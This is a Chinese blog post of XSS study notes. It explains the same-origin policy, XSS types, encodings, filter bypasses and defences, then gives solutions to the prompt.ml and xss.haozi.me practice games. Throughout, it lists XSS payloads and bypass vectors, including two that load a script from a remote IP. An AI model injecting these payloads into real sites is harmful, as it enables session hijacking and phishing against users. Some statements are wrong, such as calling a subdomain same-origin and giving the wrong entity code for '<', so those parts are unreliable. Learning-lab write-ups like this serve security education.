---
title: XSS小结
date: 2018-05-30 20:17:41
categories: Web
tags:
description:
---

菜鸡瞎写...待续
<!-- more -->

# 同源策略
>同源策略（Same  Origin Policy）是一种约定，他是浏览器最核心也是最基本的安全功能。它限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。
>如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源。


例如`http://www.byxs0x0.cn/example/example.php`
| 是否同源 | URL                                            |
| -------- | ---------------------------------------------- |
| 同源     | http://www.byxs0x0.cn/example/temple.php       |
| 同源     | http://www.byxs0x0.cn/index.php                |
| 同源     | http://sub.www.byxs0x0.cn/index.php            |
| 不同源   | http://www.byxs0x0.cn:8888/example/example.php |
| 不同源   | https://blog.byxs0x0.cn/example/example.php    |
| 不同源   | http://www.example.cn/example/example.php      |





## 同源策略到底限制了什么
浏览器会根据同源策略控制不同源之间的交互。而页面跨域的行为分为3类：
 - 通常允许跨域写操作`Cross-origin writes`。例如链接（links），重定向以及表单提交。特定少数的HTTP请求(PUT,DELETE)需要添加 preflight。
 - 通常不允许跨域读操作`Cross-origin reads`。但常可以通过内嵌资源来巧妙的进行读取访问。例如可以读取嵌入图片的高度和宽度，调用内嵌脚本的方法
 - 通常允许跨域资源嵌入`Cross-origin embedding`。
   - `<script src="..."></script>`标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。
   - `<link rel="stylesheet" href="...">`标签嵌入 CSS。由于 CSS 的松散的语法规则，CSS 的跨域需要一个设置正确的Content-Type消息头，不同浏览器有不同的限制。
   - `<img>`嵌入图片。支持的图片格式包括 PNG,JPEG,GIF,BMP,SVG,...
   - `<video>` 和 `<audio>`嵌入多媒体资源。
   - `<object>, <embed>`和 `<applet>`的插件。
   - `@font-face`引入的字体。一些浏览器允许跨域字体（cross-origin fonts），一些需要同源字体（same-origin fonts）。
   - `<frame>和<iframe>`载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。


>跨域请求可能不是浏览器直接拦截掉了，而是跨站请求发起了，但是返回结果被浏览器拦截了，请求实际上已经发送到了后端服务器。在Chrome和Firefox上，对于从https到http的跨域是会直接拦截，请求都无法发送成功。

## 同源策略为何存在
如果没有同源策略，我们去访问恶意站点，恶意站点的JS代码能通过`document.cookie`获取浏览器中所有的SessionID。


...理解的不是很深，理解待续







# XSS
>XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。
>跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。
>它发生的原因往往是从用户输入的数据到输出没有有效的过滤

## XSS分类
XSS分类大致如下：
 - 反射型
 - 存储型
 - DOM型
   - 通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。从效果来说，也是反射型。
   - 反射型或存储型是服务端将提交的内容反馈到了html源码内，导致触发xss。也就是说返回到html源码中可以看到触发xss的代码。
   - DOM型XSS只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来。
 - 其他类型XSS
   - mXSS 突变型XSS
   - UXSS 通用型XSS
   - Flash XSS
   - UTF-7 XSS
   - MHTML XSS
   - CSS XSS
   - VBScript XSS
   - 其中UTF-7、MHTML XSS、CSS XSS、VBScript XSS 只在低版本的IE中可以生效

## XSS危害
 - cookie劫持
 - 钓鱼
   - 伪造登录框，页面
 - 站点重定向
 - 获取用户信息
   - `alert(navigator.userAgent)`
 - XSS蠕虫




# XSS漏洞探测

## XSS探针
```
观察哪些代码被过滤或者转义
'';!--"<XSS>=&{()}
```

## XSS常见Payload
```
<script>alert(/xss/);</script>
<script>alert(/xss/)//
<script>alert("xss");;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script>//用分号，也可以分号+空格（回车一起使用）
<img src=1 onmouseover=alert(1)>
<a herf=1 onload=alert(1)>nmask</a>
<script>window.a==1?1:prompt(a=1)</script>
<script>a=prompt;a(1)</script>
<img src=0 onerror=confirm('1')>
```

# XSS编码
 - HTML实体编码
   - 当我们使用某些特殊字符例如`< >`时，浏览器会误以为是标签的开始或结束。那么HTML实体编码就是为了区别它们。
   - `<`的实体名称为`&lt; `，但是某些特殊符号没有实体名称，所以也可以用实体编号(`&#字符十进制数`)来表示。
   - `<`的实体编号为`&#62;`
   - 注意：实体编码后面的数字可以是`十进制`，也可以是`16进制`。
   - 实体编码最后的分号可以不加。`&#62`
   - 实体编码数字前面可以加多个0。`&#062`
   - 特殊新增的HTML5实体
     - `&colon; => [冒号]`
     - `&NewLine; => [换行]`
 - URL编码
 - JavaScript编码
   - JavaScript允许直接用码点表示Unicode字符，写法是"反斜杠+u+码点"。(码点就是16进制数字)
   - `<`的码点表示法是`\u003c`
   - 也直接通过eval执行字符串八进制和十六进制两种编码方式，其中八进制用`\56`表示，十六进制用`\x5c`表示。
 - BASE64编码
   - `<a href="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">click</a>`

浏览器解析顺序HTML->URL->JavaScript


```
<img src=x onerror=alert("xss") >
标签名和属性名之间可以用[09,0A,0C,0D,20,2F]来代替。浏览器解析器中词法分析器会跳过空白跟换行之类的无效字符。
但是属性和属性之间的空格是不可以用2F来代替的。(2F == /)
属性值部分，可以用 HTML实体编码。




```
# XSS触发点

## 利用事件触发
```
<svg/onload=prompt(1);>
<marquee/onstart=confirm(2)>/
<body onload=prompt(1);>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror="javascript:alert(1)">
```


# XSS绕过姿势
```
当= ( ) ; :被过滤时
<svg><script>alert&#40/1/&#41</script> // 通杀所有浏览器

```



 - 大小写
   - 验证规则不严谨，用大小写绕过`<sCript>`
 - 重写绕过
   - 验证规则不严谨，用重写绕过`<scri<script>pt>`

 - 使用script标签
 - 利用事件触发xss
 - JavaScript伪协议
   - `<form,<isindex`标签的`action`属性



 - 双引号改单引号
 - 引号改为/
 - 用全角字符
 - 使用javascript伪协议
 - 使用回车、空格等特殊字符
 - 在css的style中使用/**/注释符
 - 使用字符编码


# XSS防御
 - 可在cookie中设置httponly（浏览器禁止页面的js访问带有httponly属性的cookie）
 - xss filter（检查输入，设置白名单方式）
 - 输出检查（编码，转义，常用编码：html编码，js编码，16进制等)
 - 针对不同位置的输出，使用不同的处理方式
 - 处理富文本
 - header中使用content-Sencurity-Policy字段，规定请求js的域名白名单（CSP策略）




# XSS-GAME

## prompt.ml
[prompt.ml](http://prompt.ml)

### 0
```
"><script>prompt(1)</script>
```


### 1
```
<svg/onload=prompt(1)
// 后面还有一个空格
```

### 2
```
<svg><script>prompt&#x28;1)</script>    // 先进行xml解析，使得$#40;变成(
<script>eval.call`${'prompt\x281)'}`</script>
```

### 3
```
--!><script>prompt(1)</script>
在HTML5中不仅可以用-->来闭合注释，还可以用--!>
```



### 4
```
```

### 5
```
"type=image src onerror
="prompt(1)
```
利用type定义为image，在利用换行绕过过滤规则

### 6
```
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}
```
```
javascript:prompt(1)#{"action":1}

由于题目的过滤规则是document.forms[0].action
如果form表单中存在 <input name="action" value="1">
那么document.forms[0].action获取的是input标签中的值，便可以绕过过滤
```

### 7
```
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}
```
```html
"><script>/*#*/prompt/*#*/(1)/*#*/</script>

利用js注释符来闭合中间的多余代码
<p class="comment" title=""><script>/*"></p>
<p class="comment" title="*/prompt/*"></p>
<p class="comment" title="*/(1)/*"></p>
<p class="comment" title="*/</script>"></p>
```


### 8
```
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
}
```
```
不太理解答案
```



### 9
```

```
```

```


### A
```
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}
```
```
prom'pt(1)
```
### B
```
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}
```
```
"(prompt(1))in"

源码会变成
var data = {"action":"login","message":"Welcome back, "(prompt(1))in"."};

in操作符，虽然会提示语法错误，但prompt(1)依旧可以执行，至于外面加圆括号是因为前面有字符串
```
### C
```

```
```
```
### D
### E
### F

## xss.haozi.me
[xss.haozi.me](https://xss.haozi.me/#/0x00)

### 0x00
`<script>alert(1)</script>`

### 0x01
`</textarea><script>alert(1)</script>`

### 0x02
`"><script>alert(1)</script>`

### 0x03
``<script>alert`1`</script>``

### 0x04
`<img src="" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">`

### 0x05
`--!> <script>alert(1)</script> <!--`

### 0x06
```
onclick
=alert(1)
```

### 0x07
```
<svg onload=alert(1)//
<img src onerror='alert(1)'//
```

### 0x08
```
</style ><script>alert(1)</script>
```

### 0x09
```
http://www.segmentfault.com@byxs0x0.cn/alert.js

没成功，好像是因为不同源
```

### 0x0A
```
也没成功，待玩
```

### 0x0B
```
<script src="http://118.25.20.59/alert.js"></script>
```

### 0x0C
```
<scscriptript src="http://118.25.20.59/alert.js"></scrscriptipt>
```

### 0x0D
```

alert(1)
-->


%0Aalert(1)%0A--%3E
```

### 0x0E


### 0x0F
```
');alert('1
```


### 0x10
```
alert(1)
```

### 0x11
```
");alert("1
```


### 0x12
```
</script><script>alert(1)</script>
```





# 参照
[跨站的艺术-XSS入门与介绍](http://www.fooying.com/the-art-of-xss-1-introduction/)
[浅谈跨站脚本攻击与防御](https://thief.one/2017/05/31/1/)
